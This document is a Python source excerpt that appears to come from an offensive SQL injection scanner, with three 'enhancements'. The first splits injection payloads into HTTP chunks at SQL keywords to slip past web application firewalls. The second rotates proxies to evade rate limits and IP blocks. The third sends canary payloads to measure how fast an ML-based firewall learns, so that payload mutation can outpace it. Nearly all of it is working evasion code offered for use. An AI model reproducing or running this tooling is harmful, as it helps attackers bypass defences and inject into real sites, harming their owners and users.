#  Enhancement 8: Chunked Transfer Payload Splitting 

class ChunkedPayloadSplitter:
    """
    Splits SQL injection payloads across multiple HTTP chunks so no single
    chunk contains a complete malicious pattern.

    WAFs that inspect individual chunks miss the assembled payload.
    The server reassembles all chunks before processing.
    """

    @staticmethod
    def split_payload(payload: str, chunk_size: int = 4) -> str:
        """Convert payload to chunked transfer encoding body."""
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i+chunk_size]
            chunk_hex = format(len(chunk), 'x')
            chunks.append(f"{chunk_hex}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")  # Terminal chunk
        return "".join(chunks)

    @staticmethod
    def split_at_keywords(payload: str) -> str:
        """Split payload specifically at SQL keyword boundaries."""
        # Split points that break WAF signatures
        split_points = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR",
                         "SLEEP", "BENCHMARK", "WAITFOR"]
        body = payload
        chunks = []

        for kw in split_points:
            idx = body.upper().find(kw)
            if idx > 0:
                # Split right before the keyword
                before = body[:idx]
                after = body[idx:]
                if before:
                    chunks.append(f"{len(before):x}\r\n{before}\r\n")
                body = after

        if body:
            chunks.append(f"{len(body):x}\r\n{body}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks)

    @staticmethod
    def build_chunked_request(method: str, url: str, param: str,
                               payload: str, headers: Dict) -> Tuple[str, Dict]:
        """Build a complete chunked request with payload splitting."""
        body = f"{param}={payload}"
        chunked_body = ChunkedPayloadSplitter.split_at_keywords(body)
        headers = dict(headers)
        headers["Transfer-Encoding"] = "chunked"
        headers.pop("Content-Length", None)
        return chunked_body, headers


#  Enhancement 9: Automatic Proxy/IP Rotation 

class ProxyRotator:
    """
    Detects rate limiting and automatically rotates through proxy pool
    to maintain scan throughput.

    Monitors: 429 status codes, CAPTCHA pages, progressive delays,
    connection resets, and IP-based blocking patterns.
    """

    def __init__(self, proxy_list: List[str] = None):
        self._proxies = proxy_list or []
        self._current_idx = 0
        self._blocked_proxies: Set[str] = set()
        self._rate_limit_count = 0
        self._total_requests = 0

    def add_proxy(self, proxy_url: str):
        """Add a proxy to the rotation pool."""
        if proxy_url not in self._proxies:
            self._proxies.append(proxy_url)

    def get_next_proxy(self) -> Optional[str]:
        """Get next available proxy from pool."""
        if not self._proxies:
            return None
        available = [p for p in self._proxies if p not in self._blocked_proxies]
        if not available:
            # All blocked  reset and try again
            self._blocked_proxies.clear()
            available = self._proxies
        self._current_idx = (self._current_idx + 1) % len(available)
        return available[self._current_idx]

    def report_rate_limit(self, proxy: str):
        """Report that a proxy hit rate limiting."""
        self._rate_limit_count += 1
        if self._rate_limit_count >= 3:
            self._blocked_proxies.add(proxy)
            self._rate_limit_count = 0

    def should_rotate(self, response_code: int) -> bool:
        """Check if response indicates need for proxy rotation."""
        return response_code in (429, 503, 403) or response_code == 0


#  Enhancement 10: WAF Learning Rate Estimation 

class WAFLearningRateEstimator:
    """
    Measures how quickly a WAF's ML model adapts to novel payloads.
    Adjusts mutation frequency to stay ahead of WAF learning.

    Sends periodic "canary" payloads (known to work) and measures
    if they start getting blocked over time. Rising block rate
    indicates the WAF is learning.
    """

    def __init__(self):
        self._canary_results: List[Tuple[float, bool]] = []  # (timestamp, passed)
        self._learning_rate = 0.0  # 0 = static rules, 1 = fast learning
        self._mutation_budget = float('inf')

    def record_canary(self, passed: bool):
        """Record a canary probe result."""
        self._canary_results.append((time.monotonic(), passed))
        # Keep last 50 results
        if len(self._canary_results) > 50:
            self._canary_results = self._canary_results[-50:]
        self._recalculate()

    def _recalculate(self):
        """Recalculate learning rate from canary results."""
        if len(self._canary_results) < 5:
            return
        # Compare pass rate of first half vs second half
        mid = len(self._canary_results) // 2
        first_half = self._canary_results[:mid]
        second_half = self._canary_results[mid:]

        first_pass = sum(1 for _, p in first_half if p) / len(first_half)
        second_pass = sum(1 for _, p in second_half if p) / len(second_half)

        # Declining pass rate = WAF is learning
        decline = first_pass - second_pass
        self._learning_rate = max(0.0, min(1.0, decline * 2))

        # Estimate mutation budget: how many more payloads before WAF adapts
        if self._learning_rate > 0.1:
            remaining_pass = sum(1 for _, p in second_half if p)
            self._mutation_budget = max(5, remaining_pass * 3)

    @property
    def learning_rate(self) -> float:
        """0.0 = static WAF (regex only), 1.0 = fast-learning ML WAF."""
        return self._learning_rate

    @property
    def mutation_budget(self) -> float:
        """Estimated remaining payloads before WAF adapts."""
        return self._mutation_budget

    @property
    def recommended_diversity(self) -> float:
        """Recommended mutation diversity (0-1). Higher = more varied payloads."""
        return min(1.0, 0.3 + self._learning_rate * 0.7)


